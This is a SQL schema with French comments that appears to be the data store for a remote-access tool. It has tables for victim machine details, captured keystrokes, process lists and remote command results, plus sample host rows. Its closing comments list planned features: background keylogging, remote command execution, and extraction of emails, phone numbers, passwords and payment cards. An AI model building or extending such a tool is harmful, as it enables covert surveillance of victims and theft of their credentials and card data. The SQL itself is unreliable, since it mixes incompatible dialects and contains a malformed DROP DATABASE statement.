-- Active: 1746523900583@@127.0.0.1@5432@circle
CREATE DATABASE circle;

DROP DATABASE;
-- Drop tables if they exist (to reset the DB)
DROP TABLE IF EXISTS host_info;
DROP TABLE IF EXISTS processes;
DROP TABLE IF EXISTS commands;
DROP TABLE IF EXISTS keystrokes;

-- Create table for host machine information
CREATE TABLE IF NOT EXISTS host_info (
    id SERIAL PRIMARY KEY,
    client_fd INTEGER NOT NULL,
    hostname TEXT NOT NULL,
    username TEXT NOT NULL,
    os TEXT NOT NULL,
    langue TEXT NOT NULL,
    user_reference INTEGER NOT NULL,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP

);

INSERT INTO host_info (client_fd, hostname, username, os, langue, user_reference)
VALUES
(1001, 'alpha-pc',      'jdupont',   'Linux',   'fr-FR', 12458),
(1002, 'bravo-laptop',  'mbrown',    'Windows', 'en-US', 45721),
(1003, 'charlie-node',  'lin.z',     'macOS',   'zh-CN', 78324),
(1004, 'delta-work',    'aelias',    'Linux',   'es-ES', 20987),
(1005, 'echo-pc',       'tsmith',    'Windows', 'en-GB', 93456),
(1006, 'foxtrot-dev',   'klopez',    'Linux',   'pt-BR', 51829),
(1007, 'golf-machine',  'rmuller',   'macOS',   'de-DE', 30218),
(1008, 'hotel-station', 'fgupta',    'Windows', 'hi-IN', 65012),
(1009, 'india-lab',     'nmartin',   'Linux',   'fr-CA', 77634),
(1010, 'juliet-term',   'yyamada',   'Linux',   'ja-JP', 86543);

-- Create table for keystroke logging
CREATE TABLE IF NOT EXISTS keystrokes (
    id INTEGER PRIMARY KEY,
    host_id INTEGER NOT NULL,
    key TEXT NOT NULL,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (host_id) REFERENCES host_info (id) ON DELETE CASCADE
);

-- Create table for running processes
CREATE TABLE IF NOT EXISTS processes (
    id SERIAL PRIMARY KEY,
    host_id INTEGER NOT NULL,
    process_name TEXT NOT NULL,
    pid INTEGER NOT NULL,
    user_online TEXT,
    cpu_usage REAL,
    memory_usage REAL,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (host_id) REFERENCES host_info (id) ON DELETE CASCADE
);

-- Create table for executed system commands
CREATE TABLE IF NOT EXISTS commands (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    host_id INTEGER NOT NULL,
    command TEXT NOT NULL,
    result TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (host_id) REFERENCES host_info (id) ON DELETE CASCADE
);

-- Info Système
-- Récupérer infos système (nom machine, user, OS)
-- Système OS, Identification, Réseau, API

-- Processus
-- Récupérer liste des processus en cours d'exécution

-- Keylogger
-- Capturer toutes les touches tapées en arrière-plan
-- Clavier

-- Commande Système
-- Exécuter commande système et retourner résultat
-- Commande

-- Protocole Binaire
-- Concevoir protocole binaire évolutif et sérialisation
-- Protocole

-- Analyse Données
-- Extraire emails, téléphones, mots de passe, cartes
-- Analyse